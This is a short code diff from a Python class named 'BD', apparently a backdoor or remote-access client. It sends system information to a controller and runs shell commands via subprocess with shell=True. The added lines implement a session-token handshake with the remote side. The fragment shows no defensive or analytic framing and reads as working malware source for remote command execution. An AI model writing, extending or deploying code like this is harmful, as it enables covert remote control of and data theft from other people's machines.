@@ -23,6 +23,10 @@ class BD:
         }
         self.connect_send(system_info)
 
+        response = self.connect_receive()
+        self.session_token = response.get('token')
+        self.connect_send(self.session_token)
+
     def execute_sys_cmd(self, cmd):
         try:
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
